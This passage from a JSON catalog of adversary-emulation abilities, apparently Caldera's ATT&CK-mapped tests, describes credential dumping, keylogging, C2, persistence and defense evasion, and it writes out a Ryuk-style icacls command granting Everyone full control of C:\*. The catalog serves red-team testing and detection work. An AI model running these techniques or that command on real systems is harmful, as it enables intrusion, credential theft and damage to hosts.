        "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Get-wmiobject to Enumerate Domain Controllers",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "8be175eb24a31c5765554a8d8f70fc9a",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Get Administrator users for a computer",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "GetAdminMembers",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "aaf34d82-aea9-4278-8ec4-789653e4f5d9",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "Get a list of all computers in a domain",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote System Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "GetComputers (Alice)",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "0360ede1-3c28-48d3-a6ef-6e98f562c5af",
        "technique_id": "T1018",
        "repeatable": false
    },
    {
        "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "GetCurrent User with PowerShell Script",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "221d4ebcb41e708b6ee90c1c0369a969",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "Determine the Windows Domain of a computer",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Trust Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "GetDomain",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "6131397e-7765-424e-a594-3d7fb2d93a6a",
        "technique_id": "T1482",
        "repeatable": false
    },
    {
        "description": "Get Service Accounts for a domain",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "GetServiceAccounts",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Image File Execution Options Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "GlobalFlags in Image File Execution Options",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "7f43a2b144f2534eb979d2b6638e0283",
        "technique_id": "T1546.012",
        "repeatable": false
    },
    {
        "description": "An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Access Software",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "GoToAssist Files Detected Test on Windows",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "62aff7e142552ec146d8cd9146f191d5",
        "technique_id": "T1219",
        "repeatable": false
    },
    {
        "description": "Invokes the command line similar to that used by Ryuk Ransomware to grant full access to the entire C:\\ drive for Everyone.\n**icacls \"C:\\*\" /grant Everyone:F /T /C /Q**\nHowever, for this atomic we set the permission on C:\\Users\\Public so it completes faster and doesn't irreversibly affect the host.\nYou can set your own path variable to \"C:\\*\" if you prefer.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "File and Directory Permissions Modification: Windows File and Directory Permissions Modification",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Grant Full Access to folder for Everyone - Ryuk Ransomware Style",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "06d6ac81dae5c0f49dd3d5641eb2c81e",
        "technique_id": "T1222.001",
        "repeatable": false
    },
    {
        "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Griffon Recon",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f3d8f2ef5a4cbe2e39f093f31c62f38f",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's followed by two 32 character hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Gsecdump",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "27fa36b2a66d4c2ce6c0198854cda800",
        "technique_id": "T1003",
        "repeatable": false
    },
    {
        "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "495536c73651969fd80a8f263c293194",
        "technique_id": "T1546",
        "repeatable": false
    },
    {
        "description": "This test will create a new value under HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run to launch calc.exe on boot. \n*Requires reboot\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "HKCU - Policy Settings Explorer Run Key",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "23000b943f18392d477ad7a1cad6586c",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "This test will create an \"atomic_test\" key under 'HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components' to launch calc by configuring an active setup executable and \nforcing to run active setup using the \"runonce.exe /AlternateShellStartup\" command. \nWithout the \"runonce.exe /AlternateShellStartup\" command it would run during the next logon for each user.\n\nNote: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. \nThe payload will only run once unless the cleanup command is run in between tests.\n\n[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Active Setup",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "HKLM - Add atomic_test key to launch executable as part of user setup",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "22f293978e324252426f9c7e337ae181",
        "technique_id": "T1547.014",
        "repeatable": false
    },
    {
        "description": "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) \nSaid key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. \nWithout the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Active Setup",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "HKLM - Add malicious StubPath value to existing Active Setup Entry",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "b45598708fd9e5b197cb58cf193f4778",
        "technique_id": "T1547.014",
        "repeatable": false
    },
    {
        "description": "This test will append a command to the  HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit value to launch calc.exe on boot.\n* Requires reboot\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "HKLM - Append Command to Winlogon Userinit KEY Value",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "55e14d8b479b905a13976c8d94016a7b",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "This test change the default value of HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell from \"explorer.exe\" to the full path of \"C:\\Windows\\explorer.exe\" \nto log a change to the key's default value without breaking boot sequence. \nAn atacker will alternatively replace this with a custom shell. \n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "HKLM - Modify default System Shell - Winlogon Shell KEY Value ",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "29797527e006f065df5c2d1f7b1b0b56",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "An adversary may abuse the CommandProcessor AutoRun registry key to persist. Every time cmd.exe is executed, the command defined in the AutoRun key also gets executed.\n[reference](https://devblogs.microsoft.com/oldnewthing/20071121-00/?p=24433)",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "50a9be8bbff4d4ffe0b699cb8d040c6d",
        "technique_id": "T1546",
        "repeatable": false
    },
    {
        "description": "This test will create a HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run key value to launch calc.exe on boot. \n*Requires reboot\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "HKLM - Policy Settings Explorer Run Key",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "0a3220a423ed7c7804af6e3587ad8811",
        "technique_id": "T1547.001",
        "repeatable": false
    },
    {
        "description": "This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Active Setup",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "7ad5840a79f3259965fa28835dda93c4",
        "technique_id": "T1547.014",
        "repeatable": false
    },
    {
        "description": "The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) without userinteraction. \nThe HTML file is based off of the work from [Stan Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "HTML Smuggling",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "HTML Smuggling Remote Payload",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6a8261d005f99ebd1de200d3cb11cef5",
        "technique_id": "T1027.006",
        "repeatable": false
    },
    {
        "description": "This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local\nwebserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver\nand pull down the script and execute it. By default the payload will execute calc.exe on the system.\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "User Execution: Malicious File",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Headless Chrome code execution via VBA",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "98adc43648b0e4ea6e90a88ad5ae4b3d",
        "technique_id": "T1204.002",
        "repeatable": false
    },
    {
        "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Window",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Hidden Window",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f1222384fe40cc71e7dea9d182014eaf",
        "technique_id": "T1564.003",
        "repeatable": false
    },
    {
        "description": "Disable Show Hidden files switch in registry. This technique was abused by several malware to hide their files from normal user.\nSee how this trojan abuses this technique - https://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/W32~Tiotua-P/detailed-analysis.aspx \n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Hide Artifacts: Hidden Files and Directories",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Hide Files Through Registry",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "6ac8f48413127289ac42b76a0785b08f",
        "technique_id": "T1564.001",
        "repeatable": false
    },
    {
        "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Modify Registry",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Hide Windows Clock Group Policy Feature",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e9129335265410ac1034c4f064853880",
        "technique_id": "T1112",
        "repeatable": false
    },
    {
        "description": "Hooks functions in PowerShell to read TLS Communications\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Input Capture: Credential API Hooking",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Hook PowerShell TLS Encrypt/Decrypt Messages",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "00b2b957c27c8ecb65d72d9c515a3e4c",
        "technique_id": "T1056.004",
        "repeatable": false
    },
    {
        "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Hostname Discovery (Windows)",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "e7d023dfcc77f4b701b6cdce79e9c3c2",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Non-Application Layer Protocol",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "ICMP C2",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "9ed218029d8392d2b4fdedd0f44bb052",
        "technique_id": "T1095",
        "repeatable": false
    },
    {
        "description": "Leverage Global Flags Settings\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Image File Execution Options Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "IFEO Add Debugger",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "084a99acba0e75a6a5c99b8fd0bb3a92",
        "technique_id": "T1546.012",
        "repeatable": false
    },
    {
        "description": "Leverage Global Flags Settings\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: Image File Execution Options Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "IFEO Global Flags",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "9ae998b0c1d7aa13b5393f962794b50f",
        "technique_id": "T1546.012",
        "repeatable": false
    },
    {
        "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
        "buckets": [
            "exfiltration"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Automated Exfiltration",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "IcedID Botnet HTTP PUT",
        "tactic": "exfiltration",
        "plugin": "atomic",
        "ability_id": "305c23215a4bf6184ed701b5ca1d1af7",
        "technique_id": "T1020",
        "repeatable": false
    },
    {
        "description": "Identify Firewalls",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery: Security Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Identify Firewalls",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "8c06ebf8-bacf-486b-bd77-21ba8c5a5777",
        "technique_id": "T1518.001",
        "repeatable": false
    },
    {
        "description": "Find user running agent",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Owner/User Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "whoami",
                "platform": "linux",
                "parsers": [
                    {
                        "module": "plugins.stockpile.app.parsers.basic",
                        "parserconfigs": [
                            {
                                "edge": "",
                                "source": "host.user.name",
                                "custom_parser_vals": {},
                                "target": ""
                            },
                            {
                                "edge": "",
                                "source": "domain.user.name",
                                "custom_parser_vals": {},
                                "target": ""
                            }
                        ]
                    }
                ],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Identify active user",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "c0da588f-79f0-4263-8998-7496b1a40596",
        "technique_id": "T1033",
        "repeatable": false
    },
    {
        "description": "Identify all local users",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Local Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Identify local users",
        "tactic": "discovery",
        "plugin": "stockpile",
        "ability_id": "feaced8f-f43f-452a-9500-a5219488abb8",
        "technique_id": "T1087.001",
        "repeatable": false
    },
    {
        "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable Windows Event Logging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Impair Windows Audit Log Policy",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2a450a37a8601a2131ad0ecdb8188b54",
        "technique_id": "T1562.002",
        "repeatable": false
    },
    {
        "description": "Run an application as a different user",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.user.name"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            },
            {
                "relationship_match": [
                    {
                        "source": "host.user.name",
                        "edge": "has_password",
                        "target": "host.user.password"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.basic"
            }
        ],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Impersonate user",
        "tactic": "execution",
        "plugin": "stockpile",
        "ability_id": "3796a00b-b11d-4731-b4ca-275a07d83299",
        "technique_id": "T1059.001",
        "repeatable": false
    },
    {
        "description": "Create an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Import XML Schedule Task with Hidden Attribute",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "0466a75bd82ff4bb4ff79cee53ac4312",
        "technique_id": "T1053.005",
        "repeatable": false
    },
    {
        "description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Indicator Removal using FSUtil",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "9d2e91b9241ae43b517be2be98bddfd9",
        "technique_id": "T1070",
        "repeatable": false
    },
    {
        "description": "conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.\nExecuting it through command line can create process ancestry anomalies\n[Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indirect Command Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Indirect Command Execution - conhost.exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "fa212cd328e284d55b0c4d439b29caa3",
        "technique_id": "T1202",
        "repeatable": false
    },
    {
        "description": "forfiles.exe may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml)\n\"This is basically saying for each occurrence of notepad.exe in c:\\windows\\system32 run calc.exe\"\nUpon execution calc.exe will be opened.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indirect Command Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Indirect Command Execution - forfiles.exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "a1aca621b607efe3540988a30307fb13",
        "technique_id": "T1202",
        "repeatable": false
    },
    {
        "description": "The Program Compatibility Assistant (pcalua.exe) may invoke the execution of programs and commands from a Command-Line Interface.\n[Reference](https://twitter.com/KyleHanslovan/status/912659279806640128)\nUpon execution, calc.exe should open\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indirect Command Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Indirect Command Execution - pcalua.exe",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "94ee9c0fda97e9e5131d6661348650d0",
        "technique_id": "T1202",
        "repeatable": false
    },
    {
        "description": "Test execution of a .inf using InfDefaultInstall.exe\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Infdefaultinstall.yml\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Signed Binary Proxy Execution",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "InfDefaultInstall.exe .inf Execution",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "e1ae0c45990c70e3d7651c2c355f7bf9",
        "technique_id": "T1218",
        "repeatable": false
    },
    {
        "description": "Injects cred dumper exe into an available process",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection: Portable Executable Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Inject Cred dumper into process (Spookier)",
        "tactic": "credential-access",
        "plugin": "stockpile",
        "ability_id": "c9f2c7ae-0092-4ea0-b9ae-92014eba7ce7",
        "technique_id": "T1055.002",
        "repeatable": false
    },
    {
        "description": "Injects sandcat DLL into an available process",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Process Injection: Portable Executable Injection",
        "requirements": [
            {
                "relationship_match": [
                    {
                        "source": "host.process.id"
                    }
                ],
                "module": "plugins.stockpile.app.requirements.paw_provenance"
            }
        ],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Inject Sandcat into process",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "a398986f-31b0-436a-87e9-c8e82c028f3c",
        "technique_id": "T1055.002",
        "repeatable": false
    },
    {
        "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Access Token Manipulation: SID-History Injection",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Injection SID-History with mimikatz",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "33548b5551dd6fe979b00d2ad37e499b",
        "technique_id": "T1134.005",
        "repeatable": false
    },
    {
        "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Input Capture: Keylogging",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Input Capture",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "a852c0f47cea36898e87cbd8fa53f943",
        "technique_id": "T1056.001",
        "repeatable": false
    },
    {
        "description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
